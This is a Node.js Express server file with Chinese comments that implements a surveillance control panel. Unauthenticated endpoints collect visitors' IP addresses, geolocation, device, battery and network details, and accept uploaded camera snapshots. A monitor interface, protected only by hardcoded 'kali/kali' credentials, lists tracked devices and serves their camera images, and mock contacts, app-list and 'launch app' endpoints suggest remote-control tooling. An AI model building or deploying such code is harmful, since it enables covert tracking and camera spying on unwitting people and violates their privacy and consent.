const express = require('express');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const path = require('path');
const multer = require('multer');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fetch = require('node-fetch');
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');

require('dotenv').config();

// 使用内存存储而不是文件系统
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// 内存缓存
const locationCache = new Map();
const ipCache = new Map();
const deviceData = new Map();
const imageCache = new Map();

// IP地址处理函数
async function normalizeIP(ip) {
    // 如果是IPv6的本地回环地址，返回IPv4的本地回环地址
    if (ip === '::1') {
        return '127.0.0.1';
    }
    
    // 处理IPv6格式的IPv4地址
    if (ip.includes('::ffff:')) {
        return ip.replace('::ffff:', '');
    }

    return ip;
}

// 获取地理位置信息
async function getLocationInfo(ip) {
    // 检查缓存
    if (locationCache.has(ip)) {
        return locationCache.get(ip);
    }

    // 本地开发环境返回默认值
    if (ip === '127.0.0.1' || ip === '::1') {
        const localInfo = {
            city: 'Local',
            country: 'Development',
            ll: [0, 0],
            org: 'Local Network'
        };
        locationCache.set(ip, localInfo);
        return localInfo;
    }

    try {
        // 使用 geoip-lite 获取位置信息
        const geoData = geoip.lookup(ip);
        if (geoData && geoData.city && geoData.country) {
            locationCache.set(ip, geoData);
            return geoData;
        }

        // 如果没有获取到完整信息，返回默认值
        const defaultInfo = {
            city: 'Unknown',
            country: 'Unknown',
            ll: [0, 0],
            org: 'Unknown'
        };
        locationCache.set(ip, defaultInfo);
        return defaultInfo;
    } catch (error) {
        console.error('Error getting location info:', error);
        return {
            city: 'Unknown',
            country: 'Unknown',
            ll: [0, 0],
            org: 'Unknown'
        };
    }
}

class Server {
    constructor() {
        this.app = express();
        this.port = process.env.PORT || 3000;
        this.setupMiddleware();
        this.setupRoutes();
        this.setupErrorHandling();
        
        // 定期清理缓存
        setInterval(() => {
            this.cleanupCaches();
        }, 1000 * 60 * 60); // 每小时清理一次
    }

    cleanupCaches() {
        const now = Date.now();
        // 清理超过1小时的缓存
        for (const [key, value] of locationCache.entries()) {
            if (value.timestamp && now - value.timestamp > 60 * 60 * 1000) {
                locationCache.delete(key);
            }
        }
        for (const [key, value] of ipCache.entries()) {
            if (value.timestamp && now - value.timestamp > 60 * 60 * 1000) {
                ipCache.delete(key);
            }
        }
        for (const [key, value] of imageCache.entries()) {
            if (value.timestamp && now - value.timestamp > 60 * 60 * 1000) {
                imageCache.delete(key);
            }
        }
    }

    setupMiddleware() {
        // 启用详细的日志记录
        this.app.use(morgan(':method :url :status :response-time ms - :res[content-length]'));
        
        // 基础安全设置
        this.app.use(helmet({
            contentSecurityPolicy: false
        }));
        
        // CORS设置 - 允许所有来源
        this.app.use(cors({
            origin: '*',
            methods: ['GET', 'POST', 'OPTIONS'],
            allowedHeaders: ['Content-Type', 'Authorization'],
            credentials: true
        }));

        // 请求体解析 - 增加限制
        this.app.use(express.json({ limit: '50mb' }));
        this.app.use(express.urlencoded({ extended: true, limit: '50mb' }));

        // 静态文件服务
        this.app.use(express.static(path.join(__dirname, '../public')));
    }

    setupRoutes() {
        // 主页路由
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, '../public/index.html'));
        });

        // 监控页面 - 不再需要Basic认证，因为我们有了登录系统
        this.app.get('/monitor', (req, res) => {
            res.sendFile(path.join(__dirname, '../public/monitor.html'));
        });

        // 获取所有活跃用户
        this.app.get('/api/active-users', this.authenticate.bind(this), (req, res) => {
            const activeUsersData = Array.from(deviceData.entries())
                .map(([key, data]) => ({
                    ip: key.split('_')[0],
                    lastSeen: data.timestamp,
                    device: data.device,
                    location: data.location
                }))
                .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
            
            res.json(activeUsersData);
        });

        // 追踪路由 - 添加详细的错误处理
        this.app.post('/api/track', async (req, res) => {
            try {
                console.log('Received tracking data:', req.body);
                let clientIP = req.ip || req.connection.remoteAddress;
                clientIP = await normalizeIP(clientIP);
                
                const userAgent = req.headers['user-agent'];
                const parser = new UAParser(userAgent);
                const parsedUA = parser.getResult();
                const geoData = await getLocationInfo(clientIP);

                // 获取系统信息
                const deviceInfo = {
                    model: parsedUA.device.model || parsedUA.os.name || 'Unknown',
                    os: `${parsedUA.os.name || 'Unknown'} ${parsedUA.os.version || ''}`.trim(),
                    browser: `${parsedUA.browser.name || 'Unknown'} ${parsedUA.browser.version || ''}`.trim(),
                    battery: req.body.battery || { level: 0, charging: false },
                    network: req.body.network || { type: 'Unknown', downlink: 0 },
                    memory: req.body.memory || {
                        total: 0,
                        used: 0,
                        free: 0
                    }
                };

                const data = {
                    device: deviceInfo,
                    location: {
                        lat: geoData.ll?.[0] || 0,
                        lon: geoData.ll?.[1] || 0,
                        city: geoData.city,
                        country: geoData.country,
                        isp: geoData.org,
                        ip: clientIP
                    },
                    timestamp: new Date().toISOString(),
                    lastImage: null,
                    system: {
                        cpuUsage: req.body.system?.cpuUsage || 0,
                        memoryUsage: req.body.system?.memoryUsage || 0,
                        uptime: req.body.system?.uptime || 0
                    }
                };

                await this.saveDeviceData(data);
                console.log('Successfully saved device data for IP:', clientIP);
                res.status(200).json({ status: 'ok', data });
            } catch (error) {
                console.error('Error in /api/track:', error);
                res.status(500).json({ 
                    status: 'error', 
                    message: error.message,
                    stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
                });
            }
        });

        // 监控API
        this.app.get('/api/monitor', this.authenticate.bind(this), async (req, res) => {
            try {
                const allDevices = Array.from(deviceData.values());
                res.json(allDevices);
            } catch (error) {
                console.error('Error in monitor API:', error);
                res.status(500).json({ error: 'Internal server error' });
            }
        });

        // 获取应用列表
        this.app.get('/api/apps', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            const mockApps = [
                { id: 'com.whatsapp', name: 'WhatsApp', icon: '📱' },
                { id: 'com.facebook', name: 'Facebook', icon: '👥' },
                { id: 'com.instagram', name: 'Instagram', icon: '📷' },
                { id: 'com.twitter', name: 'Twitter', icon: '🐦' },
                { id: 'com.snapchat', name: 'Snapchat', icon: '👻' }
            ];
            
            res.json(mockApps);
        });

        // 获取通讯录
        this.app.get('/api/contacts', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            const mockContacts = [
                { name: '张三', phone: '138****8000', avatar: '👨' },
                { name: '李四', phone: '139****9000', avatar: '👩' },
                { name: '王五', phone: '137****7000', avatar: '🧑' }
            ];
            
            res.json(mockContacts);
        });

        // 启动应用
        this.app.post('/api/launch-app', this.authenticate.bind(this), async (req, res) => {
            const { appId } = req.body;
            const clientIP = req.query.ip;
            
            this.log(`尝试启动应用: ${appId} on device: ${clientIP}`);
            
            res.json({ status: 'success', message: `已尝试启动应用: ${appId}` });
        });

        // 处理摄像头图片上传
        this.app.post('/api/camera-update', upload.single('image'), async (req, res) => {
            await this.handleCameraUpdate(req, res);
        });

        // 获取最新的摄像头图片
        this.app.get('/api/camera-image/:ip', this.authenticate.bind(this), async (req, res) => {
            await this.getCameraImage(req, res);
        });

        // 登录验证
        this.app.post('/api/auth', (req, res) => {
            const { username, password } = req.body;
            
            if (username === 'kali' && password === 'kali') {
                res.status(200).json({ message: 'Authentication successful' });
            } else {
                res.status(401).json({ message: 'Invalid credentials' });
            }
        });
    }

    authenticate(req, res, next) {
        // 检查是否有认证头
        const authHeader = req.headers.authorization;
        
        // 如果没有认证头，检查是否是登录请求
        if (!authHeader) {
            // 登录API不需要认证
            if (req.path === '/api/auth') {
                return next();
            }
            return res.status(401).json({ error: 'Unauthorized' });
        }

        // 验证Basic认证
        if (authHeader.startsWith('Basic ')) {
            const base64Credentials = authHeader.split(' ')[1];
            const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
            const [username, password] = credentials.split(':');

            if (username === 'kali' && password === 'kali') {
                return next();
            }
        }

        res.status(401).json({ error: 'Invalid credentials' });
    }

    async saveDeviceData(data) {
        // 在内存中保存数据，而不是写入文件
        const timestamp = new Date().toISOString();
        const key = `${data.location.ip}_${timestamp}`;
        deviceData.set(key, { ...data, timestamp });
    }

    log(message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] ${message}`);
    }

    setupErrorHandling() {
        this.app.use((err, req, res, next) => {
            console.error(err.stack);
            res.status(500).json({
                error: 'Internal Server Error',
                message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
            });
        });
    }

    start() {
        this.app.listen(this.port, () => {
            console.log(`Server is running on port ${this.port}`);
            console.log(`Environment: ${process.env.NODE_ENV}`);
            console.log(`Current directory: ${__dirname}`);
        });
    }

    // 修改摄像头图片处理
    async handleCameraUpdate(req, res) {
        try {
            const clientIP = req.ip;
            const imageBuffer = req.file.buffer;
            const timestamp = Date.now();
            
            imageCache.set(clientIP, {
                buffer: imageBuffer,
                timestamp: timestamp
            });
            
            res.json({ success: true });
        } catch (error) {
            console.error('Error handling camera update:', error);
            res.status(500).json({ error: 'Failed to process image' });
        }
    }

    // 修改获取摄像头图片
    async getCameraImage(req, res) {
        try {
            const targetIP = req.params.ip;
            const imageData = imageCache.get(targetIP);
            
            if (!imageData) {
                return res.status(404).send('No image available');
            }

            res.set('Content-Type', 'image/jpeg');
            res.send(imageData.buffer);
        } catch (error) {
            console.error('Error serving camera image:', error);
            res.status(500).send('Error retrieving image');
        }
    }
}

// 创建并启动服务器
const server = new Server();
server.start(); 
